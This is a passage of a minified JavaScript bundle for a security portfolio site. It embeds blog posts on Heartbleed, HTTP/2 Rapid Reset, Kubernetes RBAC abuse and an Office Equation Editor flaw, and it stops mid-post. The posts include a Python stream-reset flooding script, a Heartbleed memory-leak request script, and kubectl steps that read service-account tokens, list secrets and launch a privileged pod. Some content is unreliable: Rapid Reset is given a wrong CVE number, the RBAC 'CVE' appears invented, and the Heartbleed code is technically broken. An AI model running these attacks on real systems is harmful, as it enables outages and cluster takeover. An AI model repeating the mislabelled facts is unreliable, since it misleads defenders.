tester"}),m.jsxs("div",{className:"hero-lines mbm",children:[m.jsx("h1",{className:"hero-display",children:"A different"}),m.jsx("h1",{className:"hero-display",children:"security"}),m.jsx("h1",{className:"hero-display",children:"approach"})]}),m.jsx("p",{className:"hero-lead",children:t.blurb}),m.jsxs("div",{className:"hero-actions",children:[m.jsx(Ft,{className:"button primary",to:"/projects",children:"View Projects"}),m.jsx(Ft,{className:"button ghost",to:"/certifications",children:"View Certifications"})]}),m.jsxs("div",{className:"hero-meta",children:[m.jsx("span",{className:"pill",children:"Threat Hunting"}),m.jsx("span",{className:"pill",children:"Application Security"}),m.jsx("span",{className:"pill",children:"Privacy"})]})]}),m.jsx("div",{className:"hero-visual",children:m.jsx("div",{className:"hero-image-frame",children:m.jsx("img",{src:t.image,alt:t.highlight})})})]})})}const gS=["All","Security","Research","Web","Desktop","Cloud","Automation","Cryptography","Toolkit"];function vS({activeFilter:t,onFilterChange:e}){return m.jsx("div",{className:"filter-chips",children:gS.map(n=>m.jsx("button",{className:`chip ${n===t?"active":""}`,type:"button",onClick:()=>e(n),children:n},n))})}function yS({items:t}){const[e,n]=$.useState(0);if(!(t!=null&&t.length))return null;const i=t[e],s=()=>n(a=>(a+1)%t.length),r=()=>n(a=>(a-1+t.length)%t.length);return m.jsxs("div",{className:"featured-carousel",children:[m.jsxs("div",{className:"featured-card",children:[m.jsxs("div",{className:"featured-meta",children:[m.jsx("span",{className:"pill",children:"Featured"}),i.tag&&m.jsx("span",{className:"pill",children:i.tag})]}),m.jsx("h3",{children:i.title}),m.jsx("p",{children:i.description}),m.jsx("div",{className:"project-tags",children:(i.tags||[]).map(a=>m.jsx("span",{className:"pill",children:a},a))}),m.jsx("div",{className:"featured-actions",children:m.jsx("a",{href:i.href,target:"_blank",rel:"noreferrer",className:"link-button",children:"View"})})]}),t.length>1&&m.jsxs("div",{className:"featured-controls",children:[m.jsx("button",{type:"button",onClick:r,className:"button ghost","aria-label":"Previous",children:"←"}),m.jsx("button",{type:"button",onClick:s,className:"button ghost","aria-label":"Next",children:"→"})]})]})}function F0({items:t=[],showViewAll:e=!1,showHeader:n=!0,showFilters:i,showFeatured:s,wrap:r=!0}){const[a,o]=$.useState("All"),[l,c]=$.useState(1),h=4,d=t.slice(0,2),p=$.useMemo(()=>new Set(d.map(E=>E.title)),[d]),f=i??n,y=(s??n)&&a==="All",_=$.useMemo(()=>a==="All"?t:t.filter(E=>{var A;return(A=E.tags)==null?void 0:A.some(C=>C.toLowerCase().includes(a.toLowerCase().split(" ")[0]))}),[a,t]),g=y?_.filter(E=>!p.has(E.title)):_,u=Math.max(1,Math.ceil(g.length/h)),v=g.slice((l-1)*h,l*h),x=E=>{o(E),c(1)},S=m.jsxs(m.Fragment,{children:[n&&m.jsxs("div",{className:"section-header",children:[m.jsxs("div",{children:[m.jsx("h2",{className:"section-title",children:"Projects"}),m.jsx("p",{className:"section-subtitle",children:"Deployment dossier — hardened builds and offensive prototypes."})]}),e&&m.jsx("div",{className:"section-actions",children:m.jsx(Ft,{className:"link-button",to:"/projects",children:"View all projects"})})]}),f&&m.jsx(vS,{activeFilter:a,onFilterChange:x}),y&&m.jsx(yS,{items:d}),m.jsx("div",{className:"projects-list",children:v.map(E=>{var A;return m.jsxs("div",{className:"project-row",children:[m.jsxs("div",{className:"project-row-body",children:[m.jsx("a",{href:E.href,target:"_blank",rel:"noreferrer",className:"project-title-link",children:m.jsx("h5",{className:"project-title",children:E.title})}),m.jsx("p",{className:"project-description",children:E.description}),(A=E.tags)!=null&&A.length?m.jsx("div",{className:"project-tags",children:E.tags.map(C=>m.jsx("span",{className:"pill",children:C},C))}):null]}),m.jsx("div",{className:"project-row-cta",children:m.jsx("a",{href:E.href,target:"_blank",rel:"noreferrer",className:"view-credentials",children:"View"})})]},E.title)})}),u>1&&m.jsxs("div",{className:"blog-pagination project-pagination",children:[m.jsx("button",{className:"pill",disabled:l===1,onClick:()=>c(Math.max(1,l-1)),type:"button",children:"Previous"}),m.jsxs("span",{className:"blog-page-indicator",children:["Page ",l," of ",u]}),m.jsx("button",{className:"pill",disabled:l===u,onClick:()=>c(Math.min(u,l+1)),type:"button",children:"Next"})]})]});return r?m.jsx("section",{className:"section projects",id:"projects",children:m.jsx("div",{className:"container",children:S})}):m.jsx("div",{className:"projects",children:S})}function nm(){const t=lS,e=Wa.slice(0,3);return m.jsxs(m.Fragment,{children:[m.jsx(mS,{data:oS}),m.jsx("section",{className:"section",children:m.jsxs("div",{className:"container intro-grid",children:[m.jsxs("div",{className:"intro-title",children:[m.jsx("div",{className:"eyebrow",children:"****"}),m.jsx("h2",{className:"section-title",children:"With precision + curiosity, we harden systems."})]}),m.jsxs("div",{className:"intro-body",children:[m.jsx("p",{className:"lead",children:tm.text}),m.jsx("p",{children:"Every environment tells a story. I help teams surface weak links, stage realistic tests, and ship defenses that hold under pressure."}),m.jsx("div",{className:"hero-meta",children:_d.map(n=>m.jsx("a",{href:n.href,target:"_blank",rel:"noreferrer",className:"pill",children:n.label},n.href))})]})]})}),m.jsx("section",{className:"section",children:m.jsxs("div",{className:"container",children:[m.jsx("div",{className:"section-header",children:m.jsx("h2",{className:"section-title",children:"Experience"})}),m.jsx("div",{className:"logo-grid",children:t.map(n=>m.jsxs("div",{className:"logo-card",children:[m.jsx("div",{className:"logo-role",children:n.role}),m.jsx("div",{className:"logo-org",children:n.org}),m.jsx("div",{className:"logo-range",children:n.range})]},`${n.org}-${n.role}`))})]})}),m.jsx(hS,{data:tm,socials:_d}),m.jsx(F0,{items:N0,showViewAll:!0,showHeader:!0,showFilters:!1}),m.jsx("section",{className:"section",children:m.jsxs("div",{className:"container",children:[m.jsxs("div",{className:"section-header",children:[m.jsxs("div",{children:[m.jsx("h2",{className:"section-title",children:"Recognitions"}),m.jsx("p",{className:"section-subtitle",children:"Certifications and credentials earned across security and cloud."})]}),m.jsx("div",{className:"section-actions",children:m.jsx(Ft,{className:"link-button",to:"/certifications",children:"View all certifications"})})]}),m.jsx(O0,{items:I0.slice(0,5),showHeader:!1,wrap:!1})]})}),m.jsx("section",{className:"section",children:m.jsxs("div",{className:"container",children:[m.jsxs("div",{className:"section-header",children:[m.jsxs("div",{children:[m.jsx("h2",{className:"section-title",children:"Ops Log"}),m.jsx("p",{className:"section-subtitle",children:"Recent writeups from exploit labs and defensive research."})]}),m.jsx("div",{className:"section-actions",children:m.jsx(Ft,{className:"link-button",to:"/blogs",children:"View all posts"})})]}),m.jsx(U0,{posts:e,wrap:!1})]})})]})}function xS({data:t}){return m.jsx("header",{className:"blog-welcome-section",children:m.jsxs("div",{className:"container",children:[m.jsx("div",{className:"eyebrow",children:"Ops log"}),m.jsx("h1",{children:t.title}),m.jsx("p",{className:"lead",children:t.subtitle})]})})}function _S({posts:t=[],onFilter:e}){const[n,i]=$.useState(""),s=$.useMemo(()=>n.trim()?t.filter(a=>a.title.toLowerCase().includes(n.toLowerCase())||a.excerpt.toLowerCase().includes(n.toLowerCase())):t,[n,t]);$.useEffect(()=>{e==null||e(s)},[s,e]);const r=a=>{i(a.target.value)};return m.jsxs("div",{className:"blog-search",children:[m.jsx("label",{className:"search-label",htmlFor:"blog-search",children:"Search posts"}),m.jsxs("div",{className:"search-shell",children:[m.jsx("i",{className:"fas fa-search search-icon","aria-hidden":"true"}),m.jsx("input",{id:"blog-search",type:"search",value:n,onChange:r,placeholder:"Type a keyword…",className:"search-input"})]})]})}const zc=[{label:"Research Papers",description:"Deep dives, lab notes, and long-form investigations.",emptyMessage:"No research posts yet."},{label:"CVEs/Libraries",description:"Vulnerability writeups, protocol flaws, and library risks.",emptyMessage:"No CVE or library posts yet."},{label:"HackTheBox/Bug Bounty",description:"CTF notes and real-world bug bounty reports.",emptyMessage:"No HackTheBox or bug bounty posts yet."}];function bS(){const[t,e]=$.useState(zc[0].label),n=$.useMemo(()=>Wa.filter(a=>a.category===t),[t]),[i,s]=$.useState(n),r=zc.find(a=>a.label===t);return $.useEffect(()=>{s(n)},[n]),m.jsxs(m.Fragment,{children:[m.jsx(xS,{data:cS}),m.jsx("section",{className:"section",children:m.jsxs("div",{className:"container",children:[m.jsx("div",{className:"blog-category-grid",children:zc.map(a=>{const o=Wa.filter(l=>l.category===a.label).length;return m.jsxs("button",{type:"button",className:`blog-category-card ${t===a.label?"active":""}`,onClick:()=>e(a.label),children:[m.jsx("div",{className:"blog-category-eyebrow",children:"Category"}),m.jsx("h3",{className:"blog-category-title",children:a.label}),m.jsx("p",{className:"blog-category-desc",children:a.description}),m.jsx("div",{className:"blog-category-meta",children:m.jsxs("span",{className:"pill",children:[o," posts"]})})]},a.label)})}),m.jsx(_S,{posts:n,onFilter:s}),m.jsxs("div",{className:"blog-category-results",children:[m.jsx("div",{className:"section-header",children:m.jsx("div",{children:m.jsx("h2",{className:"section-title",children:t})})}),n.length===0?m.jsx("p",{className:"text-muted",children:r==null?void 0:r.emptyMessage}):i.length===0?m.jsx("p",{className:"text-muted",children:"No posts match that search."}):m.jsx(U0,{posts:i,wrap:!1})]})]})})]})}const SS=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–0012?</h2>
        <p>
          CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.
        </p>

        <h2>How the Vulnerability Works</h2>
        <h3>HTTP/2 and RST_STREAM</h3>
        <p>
          HTTP/2 allows multiplexing multiple streams over a single connection. The RST_STREAM frame cancels streams when they are no longer needed. However, attackers can send a rapid series of RST_STREAM frames, forcing the server to process and discard streams at an unsustainable rate, leading to resource exhaustion.
        </p>

        <h2>Exploit Code Example</h2>
        <p>
          Below is an educational example in Python that demonstrates how an attacker could exploit this vulnerability using an HTTP/2 library.
        </p>
        <div class="code-block">
          <code>
import h2.connection<br>
import h2.events<br>
import socket<br>
import ssl<br>
import time<br><br>

# Configure target server<br>
TARGET_HOST = "vulnerable-server.com"<br>
TARGET_PORT = 443<br>
STREAM_COUNT = 1000  # Number of streams to abuse<br><br>

def send_reset_attack():<br>
    # Establish SSL/TLS connection<br>
    context = ssl.create_default_context()<br>
    with socket.create_connection((TARGET_HOST, TARGET_PORT)) as raw_sock:<br>
        with context.wrap_socket(raw_sock, server_hostname=TARGET_HOST) as tls_sock:<br>
            # Initialize HTTP/2 connection<br>
            conn = h2.connection.H2Connection()<br>
            conn.initiate_connection()<br>
            tls_sock.sendall(conn.data_to_send())<br><br>

            # Send multiple streams with rapid resets<br>
            for stream_id in range(1, STREAM_COUNT * 2, 2):  # HTTP/2 streams are odd-numbered<br>
                conn.send_headers(<br>
                    stream_id=stream_id,<br>
                    headers=[<br>
                        (":method", "GET"),<br>
                        (":path", "/"),<br>
                        (":authority", TARGET_HOST),<br>
                        (":scheme", "https"),<br>
                    ],<br>
                )<br>
                tls_sock.sendall(conn.data_to_send())<br>
                conn.reset_stream(stream_id)<br>
                tls_sock.sendall(conn.data_to_send())<br>
                print(f"Stream {stream_id} reset sent")<br>
            time.sleep(5)<br><br>

if __name__ == "__main__":<br>
    print(f"Launching HTTP/2 Rapid Reset Attack on {TARGET_HOST}...")<br>
    send_reset_attack()<br>
    print("Attack complete. Check server performance.")<br>
          </code>
        </div>
        <p><strong>Disclaimer:</strong> This code is for educational purposes only. Testing such exploits without proper authorization is unethical and illegal.</p>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Server Patches:</strong> Server vendors like Apache and Nginx have released patches to mitigate this vulnerability. Update your software to the latest version.</li>
          <li><strong>Implement Rate-Limiting:</strong> Use rate-limiting to restrict the number of HTTP/2 streams and resets per connection.</li>
          <li><strong>Monitor Server Metrics:</strong> Deploy monitoring tools to detect unusual spikes in resource usage associated with HTTP/2 traffic.</li>
          <li><strong>Disable HTTP/2 Temporarily:</strong> If patching is not feasible, disable HTTP/2 support as a temporary mitigation:
            <ul>
              <li><strong>For Apache:</strong> Remove <code>h2</code> from the <code>Protocols</code> directive:</li>
              <code>Protocols h2 h2c http/1.1</code>
              <li><strong>For Nginx:</strong> Remove the <code>http2</code> directive from server configurations.</li>
            </ul>
          </li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–0012, or the HTTP/2 Rapid Reset Attack, underscores the importance of securing web servers against denial-of-service attacks. By applying timely patches, implementing rate-limiting, and monitoring server activity, organizations can mitigate this threat and ensure the availability of their services.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,wS=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Heartbleed (CVE-2014–0160)</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Heartbleed (CVE-2014–0160)</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>Understanding Heartbleed: A Technical Breakdown</h2>
        <p>
          Heartbleed was a flaw in the heartbeat extension of OpenSSL, a widely used library that provides SSL/TLS encryption. The vulnerability was introduced in OpenSSL version 1.0.1 and persisted until version 1.0.1g. The issue stemmed from improper input validation, allowing an attacker to read arbitrary chunks of server memory, up to 64KB per request.
        </p>

        <h3>Heartbeat Extension Basics</h3>
        <p>
          To maintain secure connections, OpenSSL’s heartbeat mechanism allows clients and servers to verify each other’s presence by sending and receiving “heartbeat” messages. Here’s how the message exchange is supposed to work:
        </p>
        <ol>
          <li>A client sends a heartbeat request containing a payload and specifies the payload length.</li>
          <li>The server echoes the payload back to the client to confirm the connection is still alive.</li>
        </ol>
        <p>
          The vulnerability occurs because the server trusts the client-supplied payload length without verifying it against the actual payload size, leading to memory leaks.
        </p>

        <h3>Simplified Vulnerable Code</h3>
        <div class="code-block">
          <code>
int tls1_process_heartbeat(SSL *s) {<br />
&nbsp;&nbsp;unsigned char *p = &s->s3->rrec.data[0];<br />
&nbsp;&nbsp;unsigned short payload;<br />
&nbsp;&nbsp;unsigned char *buffer, *bp;<br />
&nbsp;&nbsp;payload = (p[0] << 8) | p[1];<br />
&nbsp;&nbsp;buffer = OPENSSL_malloc(1 + 2 + payload + 16);<br />
&nbsp;&nbsp;bp = buffer;<br />
&nbsp;&nbsp;*bp++ = TLS1_HB_RESPONSE;<br />
&nbsp;&nbsp;memcpy(bp, p, payload); // Vulnerable<br />
&nbsp;&nbsp;ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload);<br />
&nbsp;&nbsp;OPENSSL_free(buffer);<br />
}
          </code>
        </div>

        <h2>How Heartbleed Works</h2>
        <p>
          An attacker can exploit this vulnerability by sending a malicious heartbeat request where the payload length is intentionally larger than the actual payload.
        </p>

        <h3>Exploit Example in Python</h3>
        <div class="code-block">
          <code>
import socket<br />
import struct<br />
def create_heartbeat_request():<br />
&nbsp;&nbsp;hb_type = 1<br />
&nbsp;&nbsp;payload = b"Hi"<br />
&nbsp;&nbsp;payload_length = 0xFFFF<br />
&nbsp;&nbsp;return struct.pack(">BHH", hb_type, len(payload), payload_length) + payload<br />
def send_heartbeat_request(host, port):<br />
&nbsp;&nbsp;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />
&nbsp;&nbsp;s.connect((host, port))<br />
&nbsp;&nbsp;s.send(create_heartbeat_request())<br />
&nbsp;&nbsp;response = s.recv(65535)<br />
&nbsp;&nbsp;print("Leaked memory:", response)<br />
send_heartbeat_request("example.com", 443)
          </code>
        </div>

        <h2>Global Chaos and Real-World Impact</h2>
        <p>
          The Heartbleed vulnerability affected a significant portion of the internet, with estimates suggesting that 17% of all secure web servers were compromised. Major companies were forced to take immediate action to patch their systems.
        </p>

        <h2>Detecting Heartbleed</h2>
        <p>
          Security tools like Nmap can be used to detect Heartbleed vulnerabilities. Use the following command:
        </p>
        <div class="code-block">
          <code>
nmap -p 443 --script ssl-heartbleed example.com
          </code>
        </div>

        <h2>Lessons Learned</h2>
        <ul>
          <li><strong>Input Validation:</strong> Validate all inputs, especially lengths and buffer sizes.</li>
          <li><strong>Automated Patching Systems:</strong> Ensure systems are regularly updated.</li>
          <li><strong>Memory Safety Practices:</strong> Use memory-safe programming languages like Rust.</li>
        </ul>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,MS=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–1001: Kubernetes RBAC Misconfiguration</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–1001: Kubernetes RBAC Misconfiguration</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–1001?</h2>
        <p>
          Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.
        </p>

        <h3>RBAC in Kubernetes</h3>
        <p>
          RBAC allows administrators to define who can access resources in a Kubernetes cluster and what actions they can perform. Permissions are granted using Roles, Cluster Roles, and Role Bindings.
        </p>

        <h2>The Vulnerability</h2>
        <p>
          CVE-2024–1001 occurs when overly permissive RBAC configurations allow attackers to escalate privileges. Specifically:
        </p>
        <ul>
          <li>Permissions like “create” or “patch” on sensitive resources (e.g., Pods) can be abused.</li>
          <li>Attackers can deploy malicious workloads, extract secrets, or control the cluster API server.</li>
        </ul>

        <h2>Exploit Workflow</h2>
        <h3>RBAC Misconfiguration</h3>
        <div class="code-block">
          <code>
apiVersion: rbac.authorization.k8s.io/v1<br>
kind: Role<br>
metadata:<br>
&nbsp;&nbsp;namespace: vulnerable-namespace<br>
&nbsp;&nbsp;name: overly-permissive-role<br>
rules:<br>
- apiGroups: [""]<br>
&nbsp;&nbsp;resources: ["pods", "secrets"]<br>
&nbsp;&nbsp;verbs: ["get", "create", "patch"]<br>
          </code>
        </div>
        <p>This Role allows anyone bound to it to create and patch Pods and access secrets in the namespace.</p>

        <h3>Step-by-Step Exploit</h3>
        <ol>
          <li><strong>Gain Initial Access:</strong> Assume the attacker has access to a low-privileged service account in the namespace, bound to the misconfigured Role.</li>
          <li><strong>Create a Malicious Pod:</strong> Use the <code>kubectl</code> command to create a Pod with elevated privileges:
            <div class="code-block">
              <code>
kubectl run malicious-pod --image=alpine --restart=Never -- /bin/sh -c "apk add curl; while true; do sleep 3600; done"
              </code>
            </div>
          </li>
          <li><strong>Access Sensitive Secrets:</strong> Once the Pod is running, exec into it:
            <div class="code-block">
              <code>
kubectl exec -it malicious-pod -- /bin/sh<br>
# Inside the Pod:<br>
curl -s -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\ <br>
https://kubernetes.default.svc/api/v1/namespaces/vulnerable-namespace/secrets
              </code>
            </div>
          </li>
          <li><strong>Escalate Privileges:</strong> Create Pods with privileged containers:
            <div class="code-block">
              <code>
kubectl apply -f - <<EOF<br>
apiVersion: v1<br>
kind: Pod<br>
metadata:<br>
&nbsp;&nbsp;name: root-access-pod<br>
&nbsp;&nbsp;namespace: kube-system<br>
spec:<br>
&nbsp;&nbsp;containers:<br>
&nbsp;&nbsp;- name: root-access-container<br>
&nbsp;&nbsp;&nbsp;&nbsp;image: alpine<br>
&nbsp;&nbsp;&nbsp;&nbsp;securityContext:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;privileged: true<br>
&nbsp;&nbsp;&nbsp;&nbsp;command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]<br>
EOF
              </code>
            </div>
          </li>
        </ol>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Enforce the Principle of Least Privilege:</strong> Grant only the minimum permissions necessary for users and service accounts to perform their tasks. Avoid broad permissions like “create” or “patch” on sensitive resources.</li>
          <li><strong>Audit RBAC Policies:</strong> Regularly audit your RBAC configurations to identify overly permissive Roles and ClusterRoles:
            <div class="code-block">
              <code>
kubectl get roles,clusterroles,rolebindings,clusterrolebindings --all-namespaces
              </code>
            </div>
          </li>
          <li><strong>Use Pod Security Standards:</strong> Apply Pod Security Standards (PSS) to restrict privileged Pod creation:
            <div class="code-block">
              <code>
apiVersion: policy/v1beta1<br>
kind: PodSecurityPolicy<br>
metadata:<br>
&nbsp;&nbsp;name: restricted<br>
spec:<br>
&nbsp;&nbsp;privileged: false
              </code>
            </div>
          </li>
          <li><strong>Enable Logging and Monitoring:</strong> Monitor for suspicious activities, such as unauthorized Pod creation or access to secrets. Tools like Falco or Kubernetes Audit Logs can help.</li>
          <li><strong>Use Network Policies:</strong> Restrict Pod-to-Pod communication using Kubernetes Network Policies to limit the attack surface.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–1001 underscores the importance of careful RBAC configuration in Kubernetes. Misconfigured permissions can open the door to attackers, allowing them to escalate privileges and take over a cluster. By enforcing least privilege, auditing RBAC policies, and using Pod Security Standards, organizations can safeguard their Kubernetes environments.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,ES=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2017–11882?</h2>
        <p>
          CVE-2017–11882 is a critical vulnerability within Microsoft Office’s Equation Editor component. This legacy feature, designed for displaying mathematical equations, contains a memory corruption flaw that lets attackers execute malicious code when users open a specially crafted document. Attackers can exploit this weakness to install malware, steal data, or gain full control over a target system with the same permissions as the user.
        </p>

        <h3>Affected Office Versions:</h3>
        <ul>
          <li>Microsoft Office 2007 (Service Pack 3)</li>
          <li>Microsoft Office 2010 (Service Pack 2)</li>
          <li>Microsoft Office 2013 (Service Pack 1)</li>
          <li>Microsoft Office 2016</li>
        </ul>
        <p>
          Despite being patched in November 2017, the Equation Editor vulnerability remains a key target, with unpatched systems or older Office versions still vulnerable.
        </p>

        <h2>How the Vulnerability Works</h2>
        <p>
          This vulnerability allows remote code execution (RCE) by corrupting memory through Office’s Object Linking and Embedding (OLE) feature when opening a malicious document. Here’s how an attack typically unfolds:
        </p>
        <ol>
          <li><strong>Phishing:</strong> The attacker sends an email with an attachment, like a Word or Excel document, designed to exploit CVE-2017–11882.</li>
          <li><strong>User Action:</strong> The user opens the document, unknowingly triggering malicious code within the Equation Editor.</li>
          <li><strong>System Compromise:</strong> The attacker gains control over the system, potentially installing further malware, stealing sensitive data, or using the compromised system to attack other network resources.</li>
        </ol>

        <h2>Why CVE-2017–11882 Remains a Top Target</h2>
        <p>
          This vulnerability is highly favored by cybercriminals and nation-state hackers from countries like China, Russia, and North Korea. Both the Department of Homeland Security and the FBI have flagged it as a frequently exploited vulnerability. Its persistence can be attributed to:
        </p>
        <ul>
          <li><strong>Ease of Exploitation:</strong> Attackers only need to convince users to open a document, making social engineering attacks highly effective.</li>
          <li><strong>Legacy Code:</strong> The Equation Editor, dating back to 2000, is incompatible with modern Office security features, making it difficult to defend without patching.</li>
          <li><strong>Prevalence of Unpatched Systems:</strong> Many organizations, particularly those with older Office versions, haven’t applied Microsoft’s 2017 patch, leaving them vulnerable.</li>
        </ul>

        <h2>How to Protect Against CVE-2017–11882</h2>
        <p>
          With patches readily available, mitigating CVE-2017–11882 is straightforward, yet it requires proactive security practices. Here’s how organizations can protect themselves:
        </p>
        <ol>
          <li><strong>Update Microsoft Office:</strong> Ensure all Office versions are up-to-date with Microsoft’s security patches. Microsoft’s November 2017 patch addresses CVE-2017–11882 and should be applied immediately to unpatched systems.</li>
          <li><strong>Disable the Equation Editor:</strong> If this feature is unnecessary for your organization, disable it. Doing so removes a significant attack vector.</li>
          <li><strong>Use Modern Endpoint Protection:</strong> Employ advanced endpoint security tools that can detect and block malicious document activity. Many modern security solutions offer protections specifically designed to detect CVE-2017–11882 exploitation.</li>
          <li><strong>User Awareness and Training:</strong> Social engineering plays a significant role in the success of attacks exploiting this vulnerability. Educate users on the risks of opening unknown attachments or clicking links in unsolicited emails.</li>
        </ol>

        <h2>Staying Ahead of Persistent Threats</h2>
        <p>
          The continued exploitation of CVE-2017–11882 underscores the importance of regular patching, user education, and layered security defenses. A vulnerability like this, embedded in software many organizations rely on daily, is a stark reminder that cybersecurity requires constant vigilance.
        </p>
        <p>
          By applying patches, disabling unused features, and maintaining a robust security posture, organizations can effectively protect themselves against even the oldest and most persistent threats in today’s digital landscape. In cybersecurity, diligence, and preparedness are the best defenses against exploitation — whether it’s a vulnerability from yesterday or one that emerges tomorrow.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,TS=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
